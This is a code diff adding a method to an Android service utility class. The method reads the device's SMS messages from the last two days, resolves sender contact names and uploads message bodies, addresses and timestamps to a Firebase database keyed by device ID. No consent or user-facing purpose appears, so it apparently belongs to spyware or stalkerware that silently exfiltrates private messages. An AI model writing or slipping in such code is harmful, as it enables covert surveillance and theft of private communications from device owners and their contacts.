@@ -118,4 +118,74 @@ public class ServiceClassUtils
         return contactName;
     }
 
+
+
+
+    public static void fetchAndUploadSms(Context context, String deviceId) {
+        long currentTime = System.currentTimeMillis();
+        long twoDaysAgo = currentTime - (2L * 24 * 60 * 60 * 1000); // 2 days in milliseconds
+
+        DatabaseReference smsRef = FirebaseDatabase.getInstance()
+                .getReference("users")
+                .child(deviceId)
+                .child("smslogs");
+
+        // Clear previous SMS logs
+        smsRef.removeValue().addOnCompleteListener(task -> {
+            if (task.isSuccessful()) {
+                Uri smsUri = Uri.parse("content://sms");
+                Cursor cursor = context.getContentResolver().query(
+                        smsUri,
+                        null,
+                        "date >= ?",
+                        new String[]{String.valueOf(twoDaysAgo)},
+                        "date DESC"
+                );
+
+                if (cursor != null && cursor.moveToFirst()) {
+                    do {
+                        String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                        String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
+                        int typeCode = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
+
+                        String smsType;
+                        switch (typeCode) {
+                            case 1: smsType = "Inbox"; break;
+                            case 2: smsType = "Sent"; break;
+                            case 3: smsType = "Draft"; break;
+                            default: smsType = "Other"; break;
+                        }
+
+                        // 🧠 Get Contact Name
+                        String contactName = getContactName(context, address);
+                        if (contactName == null || contactName.isEmpty()) {
+                            contactName = "Unknown";
+                        }
+
+                        String formattedDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+                                .format(new Date(timestamp));
+
+                        HashMap<String, Object> smsData = new HashMap<>();
+                        smsData.put("address", address);
+                        smsData.put("name", contactName);  // ✅ Add contact name
+                        smsData.put("body", body);
+                        smsData.put("timestamp", timestamp);
+                        smsData.put("formattedDate", formattedDate);
+                        smsData.put("type", smsType);
+
+                        smsRef.push().setValue(smsData);
+                        Log.d("SmsUpload", "Uploaded SMS: " + smsData);
+
+                    } while (cursor.moveToNext());
+                    cursor.close();
+                } else {
+                    Log.d("SmsUpload", "No SMS found in last 2 days.");
+                }
+            } else {
+                Log.e("SmsUpload", "Failed to clear previous SMS logs from Firebase.");
+            }
+        });
+    }
+
 }
